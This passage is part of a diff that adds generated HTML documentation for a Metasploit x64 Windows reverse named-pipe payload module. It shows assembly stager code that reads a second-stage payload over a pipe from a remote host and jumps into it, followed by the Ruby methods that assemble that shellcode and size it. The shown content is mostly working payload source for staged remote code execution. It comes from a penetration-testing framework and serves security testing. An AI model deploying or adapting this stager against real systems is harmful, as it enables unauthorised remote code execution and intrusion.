+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualFree</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+
+    cleanup_file:
+    ; clean up the socket
+      push rdi                ; file handle
+      pop rcx                 ; hFile
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CloseHandle</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp
+
+    ; and try again
+      dec r14                 ; decrement the retry count
+      jmp retry_start
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    read_successful:
+      pop rax
+      add rbx, rax            ; buffer += bytes_received
+      sub rsi, rax            ; length -= bytes_received
+      test rsi, rsi           ; test length
+      jnz read_more           ; continue if we have more to read
+      jmp r15                 ; return into the second stage
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_exitfunk'>asm_exitfunk</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate-instance_method">
+  
+    #<strong>generate</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate the first stage</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 28</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span>
+  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span> <span class='lbrace'>{</span>
+    <span class='label'>name:</span>        <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PIPENAME</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>host:</span>        <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PIPEHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>retry_count:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ReverseConnectRetries</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>reliable:</span>    <span class='kw'>false</span>
+  <span class='rbrace'>}</span>
+
+  <span class='comment'># Generate the advanced stager if we have space
+</span>  <span class='kw'>unless</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>||</span> <span class='id identifier rubyid_required_space'>required_space</span> <span class='op'>&gt;</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>EXITFUNC</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_conf'>conf</span><span class='lbracket'>[</span><span class='symbol'>:reliable</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='kw'>true</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_generate_reverse_named_pipe'>generate_reverse_named_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_reverse_named_pipe-instance_method">
+  
+    #<strong>generate_reverse_named_pipe</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate and compile the stager</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 56</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_reverse_named_pipe'>generate_reverse_named_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_combined_asm'>combined_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    cld                     ; Clear the direction flag.
+    and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
+    call start              ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    start:
+      pop rbp               ; block API pointer
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_reverse_named_pipe'>asm_reverse_named_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  </span><span class='tstring_end'>^</span></span>
+  <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_combined_asm'>combined_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="include_send_uuid-instance_method">
+  
+    #<strong>include_send_uuid</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>By default, we don&#39;t want to send the UUID, but we&#39;ll send for certain payloads if requested.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+49
+50
+51</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 49</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(*args)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Register reverse_named_pipe specific options</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+21
+22
+23</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 21</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='op'>*</span><span class='id identifier rubyid_args'>args</span><span class='rparen'>)</span>
+  <span class='kw'>super</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="required_space-instance_method">
+  
+    #<strong>required_space</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Determine the maximum amount of space required for the features requested</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 76</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_required_space'>required_space</span>
+  <span class='comment'># Start with our cached default generated size
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>
+
+  <span class='comment'># EXITFUNK &#39;seh&#39; is the worst case, that adds 15 bytes
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>15</span>
+
+  <span class='comment'># Reliability adds bytes!
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>57</span>
+
+  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='id identifier rubyid_uuid_required_size'>uuid_required_size</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+
+  <span class='comment'># The final estimated size
+</span>  <span class='id identifier rubyid_space'>space</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="transport_config-instance_method">
+  
+    #<strong>transport_config</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+69
+70
+71</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 69</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_transport_config'>transport_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_transport_config_reverse_named_pipe'>transport_config_reverse_named_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:32:04 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
